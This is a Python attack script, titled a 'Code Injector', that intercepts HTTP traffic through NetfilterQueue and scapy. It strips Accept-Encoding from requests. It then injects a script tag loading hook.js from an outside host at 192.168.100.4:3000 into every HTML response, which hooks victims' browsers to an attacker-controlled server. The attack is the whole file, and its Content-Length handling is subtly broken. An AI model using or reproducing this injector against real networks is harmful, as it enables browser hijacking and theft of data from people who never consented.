#!/usr/bin/env python3.11

"""
 - Code Injector Script.
"""
from scapy.layers.inet import IP, TCP
from scapy.all import Raw
from contextlib import suppress
from netfilterqueue import NetfilterQueue
from re import sub, search
from optparse import OptionParser


with suppress(KeyboardInterrupt, ValueError, IndexError) as ERR:
    UserArgs: OptionParser = OptionParser()
    UserArgs.add_option(
        "-q", "--queue-num", dest="QUEUENum", help="Netfilter Queue Number "
    )
    Options, Args = UserArgs.parse_args()
    NFQN: str = Options.QUEUENum

    def TIRPPF(PKT) -> None:
        """
        * TIRPPF : Target Intercepted Request Packets Processing Function
        * NFQN : Net Filter Queue Number
        * NFQO : Net Filter Queue Object
        * SETP : Target Intercepted Scapy Edition
        * MTR : Target Modified Request
        * MRqL : Target Modified Request Load Field
        * SRqLoad : Decoded To String Load Edition Of The Original Encoded To Bytes Request-Load
        * Replace SETP[Raw].load = Accept-Encoding In Target Request With Nothing To Intercept Server-Response As Plain HTML Code And Canceling Encoding For Load Field In The Response To Be Able To Inject Code In The Response
        :param PKT: Target Intercepted Packets Stored In NetFilterQueue
        :return: None
        """
        SETP: IP = IP(PKT.get_payload())
        if SETP.haslayer(Raw):
            if SETP[TCP].dport == 80:
                SRqLoad = SETP[Raw].load.decode()
                MRqL = sub(
                    pattern="Accept-Encoding:.*?\\r\\n", repl="", string=SRqLoad
                )
                del SETP[IP].chksum
                del SETP[IP].ttl
                del SETP[TCP ].chksum

                SETP[Raw].load = MRqL.encode()
                print(SETP.show())
                # print("\r[HTTP-Request]", end=" ")
            elif SETP[TCP].sport == 80:
                print("\r[HTTP-Response]", end=" ")
                SRsLoad = SETP[Raw].load.decode()
                RsCONTENTLength = search(
                    pattern="(?:Content-Length:.)(\d*)(?:\\r\\n)",
                    string=SRsLoad,
                )
                MRsL = SRsLoad.replace(
                    "</body>",
                    '<script src="http://192.168.100.4:3000/hook.js"></script>',
                )

                if RsCONTENTLength:
                    ModifiedLoadLength = len(SETP[Raw].load)
                    NRsCONTENTLength: int = (
                        len(RsCONTENTLength.group(1)) + ModifiedLoadLength
                    )
                    MRsL.replace(RsCONTENTLength.group(1), str(NRsCONTENTLength))
                SETP[TCP].load = MRsL.encode()

        PKT.set_payload(bytes(SETP))

        PKT.accept()

    NFQO: NetfilterQueue = NetfilterQueue()
    if not NFQN:
        print("[ERROR] Missing Net Filter Queue Number ")
    else:
        NFQO.bind(int(NFQN), TIRPPF)
        NFQO.run()


if ERR:
    print(f"[ERROR] - {ERR}")
